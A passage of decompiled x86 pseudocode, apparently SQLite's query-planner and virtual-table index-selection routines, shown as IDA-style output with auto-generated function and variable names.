  bool v17; // c3
  int v19; // [esp+18h] [ebp-1B8h]
  int v20; // [esp+1Ch] [ebp-1B4h]
  int v21; // [esp+24h] [ebp-1ACh]
  double v22; // [esp+28h] [ebp-1A8h]
  __int64 v23; // [esp+30h] [ebp-1A0h]
  double v24; // [esp+38h] [ebp-198h]
  int v25; // [esp+40h] [ebp-190h]
  int v26; // [esp+44h] [ebp-18Ch]
  char v27[16]; // [esp+48h] [ebp-188h] BYREF
  double v28; // [esp+58h] [ebp-178h]
  double v29; // [esp+60h] [ebp-170h]
  int v30; // [esp+68h] [ebp-168h]
  int v31; // [esp+6Ch] [ebp-164h]
  int v32[4]; // [esp+70h] [ebp-160h] BYREF
  char v33; // [esp+80h] [ebp-150h]
  int v34; // [esp+84h] [ebp-14Ch]
  int v35; // [esp+8Ch] [ebp-144h]

  v6 = a2;
  v26 = *(_DWORD *)(a3 + 24);
  v7 = sub_1008520A((int *)a2[1], v26);
  v23 = v7;
  HIDWORD(v7) = a2[7];
  v8 = HIDWORD(v7) + 40 * a2[5];
  while ( 1 )
  {
    v21 = HIDWORD(v7);
    if ( HIDWORD(v7) >= v8 )
      return v7;
    if ( *(_WORD *)(HIDWORD(v7) + 16) != 256 )
      goto LABEL_19;
    LODWORD(v7) = HIDWORD(a4) & *(_DWORD *)(HIDWORD(v7) + 36) & ~HIDWORD(v23) | a4 & *(_DWORD *)(HIDWORD(v7) + 32) & ~(_DWORD)v23;
    if ( (a4 & *(_QWORD *)(HIDWORD(v7) + 32) & ~v23) != 0 )
      goto LABEL_19;
    v9 = *(_DWORD **)(HIDWORD(v7) + 12);
    LODWORD(v7) = HIDWORD(v23) & v9[89] | v23 & v9[88];
    if ( (v23 & *((_QWORD *)v9 + 44)) == 0 )
      goto LABEL_19;
    LODWORD(v7) = v9[7];
    v22 = 0.0;
    v24 = 0.0;
    v19 = 0;
    v10 = v7 + 40 * v9[5];
    v20 = 0;
    while ( 1 )
    {
      v25 = v7;
      if ( (unsigned int)v7 >= v10 )
        break;
      if ( *(_WORD *)(v7 + 16) == 512 )
      {
        sub_10086D7A(a3, a1, *(_DWORD *)(v7 + 12), a4, v27);
      }
      else
      {
        if ( *(_DWORD *)(v7 + 8) != v26 )
          goto LABEL_12;
        v11 = *v6;
        v35 = v7;
        v32[0] = v11;
        v32[1] = v6[1];
        v33 = 69;
        v34 = 1;
        sub_10086D7A(a3, a1, (int)v32, a4, v27);
      }
      v12 = a6;
      v19 |= v30;
      WORD1(v7) = HIWORD(v31);
      v22 = v28 + v22;
      v20 |= v31;
      HIDWORD(v7) = v21;
      v6 = a2;
      v24 = v29 + v24;
      if ( *(double *)(a6 + 16) <= v22 )
        goto LABEL_15;
      LODWORD(v7) = v25;
LABEL_12:
      LODWORD(v7) = v7 + 40;
    }
    v12 = a6;
LABEL_15:
    if ( a5 )
      v22 = sub_1008631F(v24) * v24 + v22;
    v14 = *(double *)(v12 + 16);
    v15 = v14 < v22;
    v16 = 0;
    v17 = v14 == v22;
    LOWORD(v7) = v13;
    if ( v14 > v22 )
    {
      *(double *)(v12 + 16) = v22;
      *(_DWORD *)(v12 + 32) = v19;
      LODWORD(v7) = v20;
      *(double *)(v12 + 24) = v24;
      *(_DWORD *)(v12 + 36) = v20;
      *(_DWORD *)v12 = &_ImageBase;
      *(_DWORD *)(v12 + 8) = HIDWORD(v7);
    }
LABEL_19:
    HIDWORD(v7) += 40;
  }
}
// 100864F0: variable 'v12' is possibly undefined
// 10086520: variable 'v7' is possibly undefined
// 10000000: using guessed type __int16 _ImageBase;

//----- (10086539) --------------------------------------------------------
_DWORD *__usercall sub_10086539@<eax>(int a1@<eax>, int *a2, int a3, int *a4)
{
  int v5; // ecx
  int v6; // eax
  int v7; // ebx
  _BYTE *v8; // eax
  int v9; // edi
  int v10; // ecx
  _DWORD *v11; // eax
  int v12; // eax
  _DWORD *result; // eax
  int v14; // ecx
  int v15; // ebx
  int v16; // esi
  int v17; // edx
  char v18; // bl
  _DWORD *v19; // [esp+10h] [ebp-Ch]
  _DWORD *v20; // [esp+14h] [ebp-8h]
  _BYTE *v21; // [esp+14h] [ebp-8h]
  int v22; // [esp+18h] [ebp-4h]
  int v23; // [esp+18h] [ebp-4h]
  int i; // [esp+18h] [ebp-4h]

  v5 = *(_DWORD *)(a1 + 20);
  v6 = *(_DWORD *)(a1 + 28);
  v7 = 0;
  if ( v5 > 0 )
  {
    v8 = (_BYTE *)(v6 + 16);
    do
    {
      if ( *((_DWORD *)v8 - 2) == *(_DWORD *)(a3 + 24) && (*v8 & 0x81) == 0 )
        ++v7;
      v8 += 40;
      --v5;
    }
    while ( v5 );
  }
  v9 = 0;
  if ( a4 )
  {
    v10 = *a4;
    v22 = 0;
    if ( *a4 > 0 )
    {
      v11 = (_DWORD *)a4[3];
      v20 = v11;
      do
      {
        v12 = *v11;
        if ( *(_BYTE *)v12 != 0x98 )
          break;
        if ( *(_DWORD *)(v12 + 24) != *(_DWORD *)(a3 + 24) )
          break;
        ++v22;
        v11 = v20 + 5;
        v20 += 5;
      }
      while ( v22 < v10 );
    }
    if ( v22 == v10 )
      v9 = *a4;
  }
  result = sub_1005904B(*a2, 20 * v7 + 8 * v9 + 48);
  if ( result )
  {
    v23 = 0;
    v14 = (int)&result[3 * v7 + 12];
    *result = v7;
    result[2] = v9;
    result[1] = result + 12;
    result[3] = v14;
    result[4] = v14 + 8 * v9;
    if ( *(int *)(a1 + 20) > 0 )
    {
      v15 = *(_DWORD *)(a1 + 28) + 16;
      v21 = (_BYTE *)v15;
      v19 = result + 13;
      do
      {
        if ( *(_DWORD *)(v15 - 8) == *(_DWORD *)(a3 + 24) && (*v21 & 0x81) == 0 )
        {
          *(v19 - 1) = *((_DWORD *)v21 - 1);
          v19[1] = v23;
          *(_BYTE *)v19 = *v21;
          v19 += 3;
        }
        ++v23;
        v15 = (int)(v21 + 40);
        v21 += 40;
      }
      while ( v23 < *(_DWORD *)(a1 + 20) );
    }
    v16 = 0;
    for ( i = 0; i < v9; *(_BYTE *)(v17 + v14 + 4) = v18 )
    {
      v17 = 8 * i++;
      *(_DWORD *)(v17 + v14) = *(__int16 *)(*(_DWORD *)(v16 + a4[3]) + 28);
      v18 = *(_BYTE *)(v16 + a4[3] + 12);
      v16 += 20;
    }
  }
  else
  {
    sub_10059320(a2, aOutOfMemory_2);
    return 0;
  }
  return result;
}

//----- (1008668E) --------------------------------------------------------
int __usercall sub_1008668E@<eax>(int *a1@<eax>, int *a2@<ebx>, int a3)
{
  unsigned int *v4; // esi
  int v5; // eax
  int v6; // esi
  char *v8; // [esp-4h] [ebp-10h]
  int v9; // [esp+8h] [ebp-4h]

  v4 = (unsigned int *)sub_10070E9E(a3, *a1)[2];
  v5 = (*(int (__cdecl **)(unsigned int *, int *))(*v4 + 12))(v4, a2);
  if ( v5 )
  {
    if ( v5 == 7 )
    {
      *(_BYTE *)(*a1 + 30) = 1;
    }
    else if ( v4[2] )
    {
      sub_10059320(a1, aS_15, v4[2]);
    }
    else
    {
      v8 = sub_10053FC9(v5);
      sub_10059320(a1, aS_14, v8);
    }
  }
  sub_10058EC7(*a1, v4[2]);
  v4[2] = 0;
  v6 = 0;
  if ( *a2 > 0 )
  {
    v9 = 0;
    do
    {
      if ( !*(_BYTE *)(a2[1] + v9 + 5) && *(int *)(a2[4] + 8 * v6) > 0 )
        sub_10059320(a1, "table %s: xBestIndex returned an invalid plan", *(const char **)(a3 + 4));
      v9 += 12;
      ++v6;
    }
    while ( v6 < *a2 );
  }
  return a1[16];
}

//----- (10086731) --------------------------------------------------------
_DWORD *__cdecl sub_10086731(int *a1, int *a2, int a3, __int64 a4, int *a5, _DWORD *a6, int *a7)
{
  int v7; // ebx
  _DWORD *result; // eax
  int v9; // edi
  int v10; // eax
  int v11; // edx
  _DWORD *v12; // eax
  int v13; // eax
  int v14; // ecx
  double v15; // st7
  int v16; // [esp+10h] [ebp-10h]
  _DWORD *v17; // [esp+10h] [ebp-10h]
  void *v18; // [esp+14h] [ebp-Ch]
  int v19; // [esp+18h] [ebp-8h]
  int v20; // [esp+1Ch] [ebp-4h]

  v19 = *(_DWORD *)(a3 + 12);
  memset(a6, 0, 0x28u);
  *a6 = 0x8000000;
  v7 = *a7;
  if ( *a7 || (result = sub_10086539((int)a2, a1, a3, a5), v7 = (int)result, (*a7 = (int)result) != 0) )
  {
    v16 = 0;
    v18 = *(void **)(v7 + 16);
    if ( *(int *)v7 > 0 )
    {
      v9 = *(_DWORD *)(v7 + 4) + 5;
      do
      {
        ++v16;
        *(_BYTE *)v9 = (a4 & *(_QWORD *)(40 * *(_DWORD *)(v9 + 3) + a2[7] + 24)) == 0;
        v9 += 12;
      }
      while ( v16 < *(_DWORD *)v7 );
    }
    memset(v18, 0, 8 * *(_DWORD *)v7);
    if ( *(_DWORD *)(v7 + 28) )
      sub_10058E74(*(_DWORD *)(v7 + 24));
    v10 = *(_DWORD *)(v7 + 8);
    *(double *)(v7 + 40) = 5.0e98;
    *(_DWORD *)(v7 + 24) = 0;
    *(_DWORD *)(v7 + 20) = 0;
    *(_DWORD *)(v7 + 28) = 0;
    *(_DWORD *)(v7 + 32) = 0;
    v20 = v10;
    if ( !a5 )
      *(_DWORD *)(v7 + 8) = 0;
    result = (_DWORD *)sub_1008668E(a1, (int *)v7, v19);
    if ( !result )
    {
      v11 = 0;
      if ( *(int *)v7 > 0 )
      {
        v12 = (_DWORD *)(*(_DWORD *)(v7 + 4) + 8);
        v17 = v12;
        do
        {
          if ( *((int *)v18 + 2 * v11) > 0 )
          {
            v13 = 40 * *v12;
            v14 = a2[7];
            a6[8] |= *(_DWORD *)(v13 + v14 + 24);
            a6[9] |= *(_DWORD *)(v13 + v14 + 28);
          }
          ++v11;
          v12 = v17 + 3;
          v17 += 3;
        }
        while ( v11 < *(_DWORD *)v7 );
      }
      v15 = 5.0e98;
      if ( *(double *)(v7 + 40) <= 5.0e98 )
        v15 = *(double *)(v7 + 40);
      *((double *)a6 + 2) = v15;
      a6[2] = v7;
      if ( *(_DWORD *)(v7 + 32) )
        *a6 |= 0x1000000u;
      a6[1] = 0;
      *(_DWORD *)(v7 + 8) = v20;
      return (_DWORD *)sub_10086360(a1, a2, a3, a4, (int)a5, (int)a6);
    }
  }
  return result;
}

//----- (100868CA) --------------------------------------------------------
int __usercall sub_100868CA@<eax>(int *a1@<esi>, int *a2, int a3, int a4, __int64 a5, int *a6)
{
  int v6; // ebx
  int *v7; // edi
  int v8; // eax
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // ebx
  bool v13; // cc
  int v14; // eax
  __int16 v15; // cx
  int v16; // ecx
  _DWORD *v17; // ecx
  int v18; // ecx
  int v19; // eax
  int v20; // ebx
  int v21; // eax
  int v22; // ecx
  int v23; // edx
  int v24; // ecx
  int v25; // ecx
  int v26; // eax
  int v27; // eax
  int v28; // ecx
  int *v29; // edx
  unsigned int v30; // edx
  unsigned int v31; // ecx
  bool v32; // sf
  double v33; // st6
  double v34; // st7
  double v35; // st7
  double v36; // st6
  double v37; // st7
  int *v38; // edx
  int v39; // ecx
  int v40; // eax
  int v41; // ecx
  double v42; // st7
  int result; // eax
  int v44[13]; // [esp+10h] [ebp-A0h] BYREF
  int v45; // [esp+44h] [ebp-6Ch] BYREF
  int v46[2]; // [esp+48h] [ebp-68h] BYREF
  int v47; // [esp+50h] [ebp-60h]
  int v48; // [esp+54h] [ebp-5Ch] BYREF
  int v49; // [esp+58h] [ebp-58h]
  int v50; // [esp+5Ch] [ebp-54h]
  unsigned int *v51; // [esp+60h] [ebp-50h]
  int v52; // [esp+64h] [ebp-4Ch]
  __int64 v53; // [esp+68h] [ebp-48h]
  int v54; // [esp+74h] [ebp-3Ch]
  double v55; // [esp+78h] [ebp-38h]
  int v56; // [esp+84h] [ebp-2Ch]
  double v57; // [esp+88h] [ebp-28h]
  int *v58; // [esp+90h] [ebp-20h]
  int v59; // [esp+94h] [ebp-1Ch]
  int v60; // [esp+98h] [ebp-18h]
  int v61; // [esp+9Ch] [ebp-14h]
  int v62; // [esp+A4h] [ebp-Ch]
  int *v63; // [esp+A8h] [ebp-8h]
  int v64; // [esp+ACh] [ebp-4h]

  v48 = -1;
  v6 = a4;
  v56 = *(_DWORD *)(a4 + 24);
  memset(a1, 0, 0x28u);
  *((double *)a1 + 2) = 1.0e99;
  v7 = *(int **)(a4 + 52);
  v8 = (16 * (~*(_BYTE *)(a4 + 21) & 8)) | 3;
  v47 = v8;
  if ( v7 )
  {
    v63 = v7;
    v52 = -12289;
    v54 = v8;
  }
  else
  {
    memset(v44, 0, sizeof(v44));
    v44[1] = 1;
    v44[2] = (int)&v48;
    v46[1] = 1;
    v9 = *(_DWORD *)(a4 + 12);
    v10 = *(_BYTE *)(a4 + 22) == 0;
    v44[3] = (int)v46;
    LOBYTE(v44[6]) = 5;
    v44[4] = v9;
    v11 = *(_DWORD *)(v9 + 20);
    if ( v10 )
      v44[8] = v11;
    if ( v11 )
      v46[0] = **(_DWORD **)(v11 + 12);
    else
      v46[0] = 1000000;
    v63 = 0;
    v7 = v44;
    v52 = -983041;
    v54 = 3;
  }
  if ( v7 )
  {
    while ( 1 )
    {
      v12 = 0;
      v13 = v7[1] <= 0;
      v51 = (unsigned int *)v7[3];
      v64 = 0;
      v60 = 0;
      v61 = 0;
      HIDWORD(v55) = 0;
      v62 = 1;
      v59 = 100;
      v50 = 0;
      v49 = 0;
      v58 = 0;
      if ( !v13 )
      {
        do
        {
          v14 = sub_10085449(a3, v56, *(_DWORD *)(v7[2] + 4 * v12), a5, v54, v63);
          if ( !v14 )
            break;
          v15 = *(_WORD *)(v14 + 16);
          v64 |= 0x11000u;
          if ( (v15 & 1) != 0 )
          {
            v16 = *(_DWORD *)v14;
            v64 |= 0x40000u;
            if ( (*(_WORD *)(v16 + 2) & 0x800) != 0 )
            {
              v62 *= 25;
              HIDWORD(v55) = 1;
            }
            else
            {
              v17 = *(_DWORD **)(v16 + 16);
              if ( v17 )
                v62 *= *v17 + 1;
            }
          }
          else if ( (v15 & 0x80u) != 0 )
          {
            v64 |= 0x80000u;
          }
          v18 = *(_DWORD *)(v14 + 24);
          v19 = *(_DWORD *)(v14 + 28);
          v60 |= v18;
          v61 |= v19;
          v13 = ++v12 < v7[1];
          v58 = (int *)v12;
        }
        while ( v13 );
      }
      if ( v12 >= v7[1] )
      {
        if ( *((_BYTE *)v7 + 24) && (v64 & 0xC0000) == 0 )
          v64 |= 0x4000000u;
      }
      else
      {
        v20 = *(_DWORD *)(v7[2] + 4 * v12);
        if ( sub_10085449(a3, v56, v20, a5, 60, v63) )
        {
          v59 = sub_10085449(a3, v56, v20, a5, 24, v63);
          v21 = sub_10085449(a3, v56, v20, a5, 36, v63);
          v22 = v59;
          if ( v21 && (v59 = 11, v22) || (v59 = 33, v22) )
          {
            v23 = *(_DWORD *)(v22 + 24);
            v24 = *(_DWORD *)(v22 + 28);
            v64 |= 0x100000u;
            v60 |= v23;
            v61 |= v24;
          }
          if ( v21 )
          {
            v25 = *(_DWORD *)(v21 + 24);
            v26 = *(_DWORD *)(v21 + 28);
            v64 |= 0x200000u;
            v60 |= v25;
            v61 |= v26;
          }
          v64 |= 0x22000u;
        }
        v12 = (int)v58;
      }
      if ( a6 )
      {
        if ( (v64 & 0xC0000) != 0 || !sub_100861C1(a6, (int)v7, a2, *(int **)(a3 + 4), v56, v12, &v45) )
          v50 = 1;
        else
          v64 |= (v45 != 0 ? 0x2000000 : 0) | 0x1022000;
      }
      if ( v63 && v64 )
      {
        v27 = *(_DWORD *)(a4 + 40);
        HIDWORD(v53) = *(_DWORD *)(a4 + 44);
        v28 = v63[1];
        LODWORD(v53) = v27;
        if ( v28 > 0 )
        {
          v29 = (int *)v63[2];
          v58 = v29;
          HIDWORD(v57) = v28;
          do
          {
            if ( *v29 < 63 )
            {
              v53 &= ~(1i64 << *v29);
              v27 = v53;
            }
            v29 = v58 + 1;
            v10 = HIDWORD(v57)-- == 1;
            ++v58;
          }
          while ( !v10 );
        }
        if ( HIDWORD(v53) | v27 )
          v49 = 1;
        else
          v64 |= 0x800000u;
      }
      v30 = v51[v12];
      v57 = (double)(v62 * v30);
      if ( HIDWORD(v55) )
      {
        v31 = *v51;
        v32 = (*v51 & 0x80000000) != 0;
        HIDWORD(v55) = *v51;
        v33 = (double)SHIDWORD(v55);
        if ( v32 )
          v33 = v33 + 4294967296.0;
        if ( v33 < v57 + v57 )
        {
          v57 = (double)(v31 >> 1);
          HIDWORD(v55) = v30;
          v62 = (int)(v57 / (double)v30);
        }
      }
      v32 = (*v51 & 0x80000000) != 0;
      HIDWORD(v55) = *v51;
      v34 = (double)SHIDWORD(v55);
      if ( v32 )
        v34 = v34 + 4294967296.0;
      v35 = sub_1008631F(v34) * (double)v62 + v57;
      v36 = (double)v59;
      v57 = v57 * v36 / 100.0;
      v37 = v35 * v36 / 100.0;
      v55 = v37;
      if ( v50 )
        v37 = sub_1008631F(v37) * v55 + v55;
      v38 = v63;
      if ( !v63 )
        break;
      if ( !v49 )
        v37 = v37 * 0.5;
      v39 = v64;
      if ( v64 )
        goto LABEL_65;
LABEL_61:
      if ( *(_DWORD *)(a4 + 52) )
      {
        v6 = a4;
        goto LABEL_68;
      }
      v7 = (int *)v7[8];
      v52 = -12289;
      v54 = v47;
      v63 = v7;
      if ( !v7 )
      {
        v6 = a4;
        goto LABEL_68;
      }
    }
    v39 = v64;
LABEL_65:
    if ( v37 < *((double *)a1 + 2) )
    {
      v40 = v60;
      *((double *)a1 + 2) = v37;
      v41 = v52 & v39;
      v42 = v57;
      a1[8] = v40;
      *((double *)a1 + 3) = v42;
      a1[9] = v61;
      *a1 = v41;
      a1[1] = v12;
      a1[2] = (int)v38;
    }
    goto LABEL_61;
  }
LABEL_68:
  if ( !a6 && (*(_DWORD *)(*a2 + 12) & 0x1000000) != 0 )
    *a1 |= 0x2000000u;
  sub_10086360(a2, a3, v6, a5, HIDWORD(a5), a6, a1);
  result = v54;
  *a1 |= v54;
  return result;
}
// 10086360: using guessed type _DWORD __cdecl sub_10086360(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10086D7A) --------------------------------------------------------
void __usercall sub_10086D7A(int a1@<eax>, int *a2@<edi>, int a3, __int64 a4, void *a5)
{
  int v5; // eax
  int v6; // [esp+4h] [ebp-4h] BYREF

  if ( (*(_BYTE *)(*(_DWORD *)(a1 + 12) + 34) & 0x10) != 0 )
  {
    v6 = 0;
    sub_10086731((int)a2, a3, a1, a4, SHIDWORD(a4), 0, a5, (int)&v6);
    v5 = v6;
    if ( *(_DWORD *)(v6 + 28) )
    {
      sub_10058E74(*(_DWORD *)(v6 + 24));
      v5 = v6;
    }
    sub_10058EC7(*a2, v5);
  }
  else
  {
    sub_100868CA((int *)a5, a2, a3, a1, a4, 0);
  }
}

//----- (10086DE3) --------------------------------------------------------
void __cdecl sub_10086DE3(int a1)
{
  int v1; // ecx
  char v2; // al
  int v3; // eax
  int v4; // eax

  if ( v1 )
  {
    while ( 1 )
    {
      v2 = *(_BYTE *)(v1 + 18);
      if ( (v2 & 4) != 0 || *(_DWORD *)(a1 + 12) && (*(_BYTE *)(*(_DWORD *)v1 + 2) & 1) == 0 )
        break;
      *(_BYTE *)(v1 + 18) = v2 | 4;
      v3 = *(_DWORD *)(v1 + 4);
      if ( v3 < 0 )
        break;
      v4 = *(_DWORD *)(*(_DWORD *)(v1 + 20) + 28) + 40 * v3;
      if ( (*(_BYTE *)(v4 + 19))-- != 1 )
        break;
      v1 = v4;
    }
  }
}
// 10086DE8: variable 'v1' is possibly undefined

//----- (10086E22) --------------------------------------------------------
int __usercall sub_10086E22@<eax>(int a1@<ecx>, unsigned __int16 *a2@<eax>, int a3, int a4)
{
  unsigned __int16 *v4; // edi
  bool v5; // zf
  int result; // eax
  int *v7; // ebx

  v4 = a2;
  v5 = a2 == 0;
  result = a3;
  v7 = *(int **)(a3 + 12);
  if ( !v5 )
  {
    while ( a1 > 0 && *(_BYTE *)v4 == 98 )
    {
      --a1;
      ++a4;
      v4 = (unsigned __int16 *)((char *)v4 + 1);
    }
    while ( a1 > 1 && *((_BYTE *)v4 + a1 - 1) == 98 )
      --a1;
    if ( a1 > 0 )
    {
      sub_1005ABE8((int)v7, 29, a4, a1);
      sub_1005AFA8(-1, v7, v4, (_BYTE *)a1);
      return sub_100772A8(a3, a1, a4);
    }
  }
  return result;
}

//----- (10086E8B) --------------------------------------------------------
int __usercall sub_10086E8B@<eax>(int a1@<esi>, int *a2, char **a3, int a4)
{
  char *v4; // edi
  char v5; // cl
  int v6; // eax
  int v7; // ebx
  _DWORD *v8; // eax
  int *v9; // edi
  int v10; // eax
  int v12; // [esp+8h] [ebp-Ch]
  int v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]

  v4 = *a3;
  v5 = **a3;
  v14 = a2[3];
  if ( v5 == 76 )
  {
    v13 = sub_10077418(a2, *((unsigned __int8 **)v4 + 3), a4);
  }
  else if ( v5 == 73 )
  {
    v13 = a4;
    sub_1005ABE8(a2[3], 10, 0, a4);
  }
  else
  {
    v13 = a4;
    v6 = sub_100769EF(a2, (int)v4, 0);
    v7 = *((_DWORD *)v4 + 6);
    v12 = v6;
    sub_1005ABE8(v14, 64, v7, 0);
    if ( !*(_DWORD *)(a1 + 52) )
      *(_DWORD *)(a1 + 28) = sub_1005AC63(v14);
    ++*(_DWORD *)(a1 + 52);
    v8 = sub_10059167(*a2, *(void **)(a1 + 56), 8 * *(_DWORD *)(a1 + 52));
    *(_DWORD *)(a1 + 56) = v8;
    if ( v8 )
    {
      v9 = &v8[2 * *(_DWORD *)(a1 + 52) - 2];
      *v9 = v7;
      if ( v12 == 1 )
        v10 = sub_1005ABE8(v14, 60, v7, a4);
      else
        v10 = sub_1005AB66(v14, 28, v7, 0, a4);
      v9[1] = v10;
      sub_1005ABD1(v14, 73, a4);
    }
    else
    {
      *(_DWORD *)(a1 + 52) = 0;
    }
  }
  sub_10086DE3(a1);
  return v13;
}

//----- (10086F8B) --------------------------------------------------------
int __usercall sub_10086F8B@<eax>(_DWORD *a1@<edi>, int *a2, int a3, __int64 a4, int a5, _DWORD *a6)
{
  int *v6; // ebx
  int v7; // eax
  int *v8; // edx
  _BYTE *v9; // eax
  int v10; // esi
  int v11; // esi
  int v12; // eax
  unsigned __int8 v13; // cl
  char *v14; // esi
  int v16; // [esp+Ch] [ebp-24h]
  int v17; // [esp+10h] [ebp-20h]
  _DWORD *v18; // [esp+14h] [ebp-1Ch]
  int v19; // [esp+18h] [ebp-18h]
  int v20; // [esp+1Ch] [ebp-14h]
  int v21; // [esp+20h] [ebp-10h]
  unsigned __int8 *v22; // [esp+20h] [ebp-10h]
  int v23; // [esp+24h] [ebp-Ch]
  _DWORD *v24; // [esp+28h] [ebp-8h]
  int v25; // [esp+2Ch] [ebp-4h]
  int v26; // [esp+48h] [ebp+18h]

  v17 = a1[4];
  v24 = (_DWORD *)a1[2];
  v6 = a2;
  v7 = a2[18];
  v8 = (int *)a2[3];
  v25 = v7 + 1;
  v19 = a1[1];
  a2[18] = a5 + v19 + v7;
  v20 = (int)v8;
  v16 = a5 + v19;
  v9 = (_BYTE *)sub_10079249(v8, v24);
  v10 = 0;
  v18 = sub_10059194(v9);
  if ( !v18 )
    *(_BYTE *)(*a2 + 30) = 1;
  v26 = 0;
  if ( v19 > 0 )
  {
    while ( 1 )
    {
      v21 = sub_10085449(a3, v17, *(_DWORD *)(v24[2] + 4 * v10), a4, *a1, v24);
      if ( !v21 )
        break;
      v23 = v10 + v25;
      v11 = sub_10086E8B((int)a1, v6, (char **)v21, v10 + v25);
      if ( v11 != v23 )
      {
        if ( v16 == 1 )
        {
          sub_10078A70((int)v6, v25);
          v25 = v11;
        }
        else
        {
          sub_1005ABE8(v20, 15, v11, v23);
        }
      }
      if ( (*(_BYTE *)(v21 + 16) & 0x81) == 0 )
      {
        v12 = *(_DWORD *)(*(_DWORD *)v21 + 12);
        v22 = (unsigned __int8 *)v12;
        while ( *(_BYTE *)v12 == 0x9D || *(_BYTE *)v12 == 0x9C )
          v12 = *(_DWORD *)(v12 + 8);
        v13 = *(_BYTE *)v12;
        if ( *(_BYTE *)v12 == 0x84 )
          v13 = *(_BYTE *)(v12 + 35);
        if ( v13 != 94 && (v13 <= 0x80u || v13 > 0x83u) )
          sub_1005ABE8(v20, 73, v25 + v26, a1[6]);
        if ( v18 )
        {
          v14 = (char *)v18 + v26;
          if ( sub_10075A35(v22, *((_BYTE *)v18 + v26)) == 98 )
            *v14 = 98;
          v6 = a2;
          if ( sub_10076904((char *)v22, *v14) )
            *v14 = 98;
        }
      }
      if ( ++v26 >= v19 )
        break;
      v10 = v26;
    }
  }
  *a6 = v18;
  return v25;
}

//----- (1008710B) --------------------------------------------------------
__int64 __cdecl sub_1008710B(int a1, int a2, char a3, __int64 a4)
{
  int *v4; // ebx
  int v5; // ecx
  int v6; // edi
  _DWORD *v7; // eax
  unsigned int v8; // ecx
  int v9; // eax
  int v10; // eax
  bool v11; // zf
  unsigned int v12; // eax
  int v13; // eax
  void *v14; // ecx
  _DWORD *v15; // edx
  int v16; // eax
  int *v17; // ebx
  void *v18; // eax
  int v19; // esi
  _BYTE *v20; // ecx
  int v21; // eax
  char **v22; // eax
  int v23; // eax
  int v24; // esi
  int v25; // ebx
  int *v26; // ecx
  _BYTE *v27; // eax
  unsigned __int8 *v28; // esi
  int v29; // edi
  int v30; // eax
  int v31; // eax
  int v32; // esi
  int v33; // eax
  int v34; // eax
  bool v35; // al
  int v36; // ebx
  _DWORD *v37; // eax
  int v38; // esi
  int v39; // ecx
  int v40; // edx
  _BYTE *v41; // eax
  int v42; // ebx
  unsigned __int16 *v43; // edi
  int v44; // esi
  int j; // eax
  unsigned __int8 v46; // cl
  char *v47; // esi
  int v48; // ebx
  int *v49; // edi
  int v50; // esi
  unsigned __int8 v51; // al
  unsigned __int16 *v52; // edi
  char *v53; // esi
  int *v54; // edi
  int v55; // eax
  int v56; // ebx
  int v57; // ebx
  int v58; // eax
  int v59; // eax
  int v60; // eax
  int v61; // eax
  int v62; // esi
  __int16 v63; // ax
  int v64; // esi
  int *v65; // esi
  unsigned __int8 *v66; // ecx
  int v67; // eax
  int v68; // eax
  int v69; // eax
  int v70; // eax
  int v71; // ecx
  _DWORD *v72; // esi
  __int64 v73; // rax
  int v74; // esi
  unsigned __int8 *v75; // eax
  int *v76; // eax
  _DWORD *v77; // esi
  int m; // edi
  void *v80; // [esp-8h] [ebp-8Ch]
  int v81; // [esp-4h] [ebp-88h]
  int v82; // [esp-4h] [ebp-88h]
  unsigned __int8 *v83; // [esp-4h] [ebp-88h]
  int v84; // [esp-4h] [ebp-88h]
  int v85; // [esp-4h] [ebp-88h]
  int v86; // [esp+Ch] [ebp-78h]
  _DWORD v87[7]; // [esp+10h] [ebp-74h]
  int v88[3]; // [esp+2Ch] [ebp-58h]
  int v89; // [esp+38h] [ebp-4Ch] BYREF
  int v90; // [esp+3Ch] [ebp-48h]
  int v91; // [esp+40h] [ebp-44h]
  int v92; // [esp+44h] [ebp-40h]
  int v93; // [esp+48h] [ebp-3Ch]
  unsigned int v94; // [esp+4Ch] [ebp-38h]
  int v95; // [esp+50h] [ebp-34h]
  void *v96; // [esp+54h] [ebp-30h] BYREF
  int v97; // [esp+58h] [ebp-2Ch]
  int v98; // [esp+5Ch] [ebp-28h]
  void *Src; // [esp+60h] [ebp-24h]
  _BYTE *v100; // [esp+64h] [ebp-20h]
  int v101; // [esp+68h] [ebp-1Ch]
  _DWORD *v102; // [esp+6Ch] [ebp-18h]
  int v103; // [esp+70h] [ebp-14h]
  int v104; // [esp+74h] [ebp-10h]
  int v105; // [esp+78h] [ebp-Ch]
  int v106; // [esp+7Ch] [ebp-8h]
  int *v107; // [esp+80h] [ebp-4h]
  int i; // [esp+90h] [ebp+Ch]
  _BYTE *v109; // [esp+90h] [ebp+Ch]
  _BYTE *v110; // [esp+90h] [ebp+Ch]
  int v111; // [esp+90h] [ebp+Ch]
  _WORD *v112; // [esp+90h] [ebp+Ch]
  int k; // [esp+90h] [ebp+Ch]
  int v114; // [esp+90h] [ebp+Ch]

  v4 = *(int **)a1;
  v5 = *(_DWORD *)(a1 + 8);
  v107 = *(int **)(*(_DWORD *)a1 + 12);
  v102 = *(_DWORD **)(a1 + 28);
  v97 = 0;
  v6 = (a2 << 6) + a1 + 32;
  v7 = (_DWORD *)(56 * *(unsigned __int8 *)((a2 << 6) + a1 + 72) + v5 + 8);
  v8 = *(_DWORD *)v6;
  Src = v7;
  v105 = v7[6];
  v106 = (int)v4;
  v104 = v6;
  v103 = (v8 >> 25) & 1;
  v89 = (v8 & 0x800000) != 0 && (a3 & 0x40) == 0;
  v9 = sub_1005AC63((int)v107);
  v98 = v9;
  *(_DWORD *)((a2 << 6) + a1 + 60) = v9;
  *(_DWORD *)((a2 << 6) + a1 + 56) = v9;
  v10 = sub_1005AC63((int)v107);
  v11 = *(_BYTE *)((a2 << 6) + a1 + 72) == 0;
  v92 = v10;
  *(_DWORD *)((a2 << 6) + a1 + 64) = v10;
  if ( !v11 && (*((_BYTE *)Src + 21) & 8) != 0 )
  {
    v81 = ++v4[18];
    *(_DWORD *)((a2 << 6) + a1 + 44) = v81;
    sub_1005ABE8((int)v107, 7, 0, v81);
  }
  v12 = *(_DWORD *)v6;
  if ( (*(_DWORD *)v6 & 0x8000000) != 0 )
  {
    v13 = *(_DWORD *)((a2 << 6) + a1 + 40);
    v14 = *(void **)v13;
    v15 = *(_DWORD **)(v13 + 16);
    v89 = v13;
    v16 = *(_DWORD *)(v13 + 4);
    ++v4[21];
